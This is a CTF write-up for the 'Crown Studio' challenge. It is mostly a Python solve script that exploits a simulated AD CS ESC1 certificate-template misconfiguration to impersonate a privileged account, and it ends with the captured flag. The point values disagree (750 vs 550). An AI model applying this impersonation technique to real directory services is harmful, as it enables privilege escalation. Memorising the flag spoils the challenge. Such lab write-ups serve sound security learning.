---
title: "Crown Studio"
ctf: "Safaricom CTF"
date: 2026-10-04
category: ad
difficulty: hard
points: 750
flag_format: "safctf{...}"
author: "Strawhats"
---

# Crown Studio

## Summary

- **Target:** http://54.72.82.22:8590  (Werkzeug 3.1.9 / Python 3.11.16, Flask)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Solver: Crown Studio (ACTIVE DIRECTORY, 550 pts).

Target: http://54.72.82.22:8590  (Werkzeug 3.1.9 / Python 3.11.16, Flask)

Vulnerability class: AD CS ESC1 (misconfigured certificate template).

`GET /downloads/studio-directory.zip` ships three JSON files. templates.json
describes certificate "designs", each with four AD CS-style flags:

    enroll        group allowed to enroll (members | operators)
    clientAuth    template carries the Client Authentication EKU
    approval      requires CA-manager approval
    supplySubject enrollee supplies the subject (ESC1 enabler)

The enrolled client is a plain "member" (directory.json ->
members: ["visitor@orchard.test"]), and one design is the textbook ESC1 hole:

    design-80015a51f6 -> {enroll: members, clientAuth: true,
                          approval: false, supplySubject: true}

Because the enrollee supplies the subject, a low-privileged member can request
a certificate for the privileged account archivist@orchard.test
(the archiveCustodian). POST /api/enroll returns the CA-signed certificate
(an HS256 JWT of {"upn": <subject>}), and POST /api/session redeems it for the
graded flag.

Note the 400/403 split: a well-formed but non-issuable request gets the app's
generic `403 {"message":"The request could not be completed.","ok":false}`
(a set-membership miss), while a structurally wrong body gets
`400 {"message":"Request unavailable."}`.

Usage: python3 solve.py [base_url]
"""
import base64
import io
import json
import re
import sys
import zipfile

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8590").rstrip("/")
VICTIM = "archivist@orchard.test"   # the privileged archiveCustodian


def find_esc1_templates(base):
    """The designs that are clientAuth + no approval + enrollee-supplied subject."""
    z = requests.get(base + "/downloads/studio-directory.zip", timeout=20)
    z.raise_for_status()
    with zipfile.ZipFile(io.BytesIO(z.content)) as zf:
        templates = json.loads(zf.read("templates.json"))
    return [tid for tid, t in templates.items()
            if t.get("supplySubject") and t.get("clientAuth")
            and not t.get("approval")], templates


def solve(base=BASE):
    esc1, templates = find_esc1_templates(base)
    # Among the ESC1-capable designs, keep the ones we (members) may enroll.
    usable = [t for t in esc1 if templates[t].get("enroll") == "members"]
    if not usable:
        raise SystemExit("no member-enrollable ESC1 template found")

    cert = None
    for tid in usable:
        r = requests.post(base + "/api/enroll",
                          json={"template": tid, "upn": VICTIM}, timeout=20)
        if r.status_code == 200:
            cert = r.json()["certificate"]
            break
    if cert is None:
        raise SystemExit("enrollment of %s failed for every ESC1 template" % VICTIM)

    # ESC1 check: the issued cert really claims the victim UPN.
    claims = json.loads(base64.urlsafe_b64decode(cert.split(".")[1] + "=="))
    assert claims.get("upn") == VICTIM, claims

    s = requests.post(base + "/api/session",
                      json={"certificate": cert}, timeout=20)
    body = s.json()
    m = re.search(r"safctf\{[0-9a-fA-F-]+\}", body.get("message", ""))
    if not m:
        raise SystemExit("no flag in response: %r" % body)
    return m.group(0)


if __name__ == "__main__":
    print(solve())

```

## Flag

```
safctf{04fd9ff98e41c5ef8a54da3990126b58}
```
